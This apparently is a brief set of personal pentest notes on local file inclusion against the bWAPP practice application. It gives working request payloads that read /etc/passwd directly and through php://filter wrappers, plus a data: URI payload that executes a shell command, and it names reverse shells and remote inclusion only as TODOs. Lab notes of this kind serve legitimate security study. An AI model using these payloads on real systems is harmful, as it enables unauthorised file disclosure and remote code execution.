# LFI



## LFI in bwapp

```JAVASCRIPT
ORIGINAL REQUEST:
GET /bWAPP/rlfi.php?language=lang_en.php HTTP/1.1

VULNERABLE REQUEST:
GET /bWAPP/rlfi.php?language=/etc/passwd HTTP/1.1
```


## LFI using php string filter

```JAVASCRIPT
ORIGINAL REQUEST:
GET /bWAPP/rlfi.php?language=lang_en.php HTTP/1.1

VULNERABLE REQUEST:
GET /bWAPP/rlfi.php?language=php://filter/sring.tolower/resource=file:///etc/passwd HTTP/1.1

```


## LFI using php conversion filter

```JAVASCRIPT
ORIGINAL REQUEST:
GET /bWAPP/rlfi.php?language=lang_en.php HTTP/1.1

VULNERABLE REQUEST:
GET /bWAPP/rlfi.php?language=php://filter/convert.base64-encode/resource=file:///etc/passwd HTTP/1.1
```


## LFI using php data filter

```JAVASCRIPT
RUNNING OS COMMAND:
GET /bWAPP/rlfi.php?language=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKTs/Pg== HTTP/1.1

**NOTE: the payload is "<?php echo shell_exec("dir");?>"
```

TODO: NOTE DOWN THE PROCESS OF TAKING REVERSHELL

TODO: NOTE DOWN THE PROCESS OF RFI USING A DIFFERENT SERVER
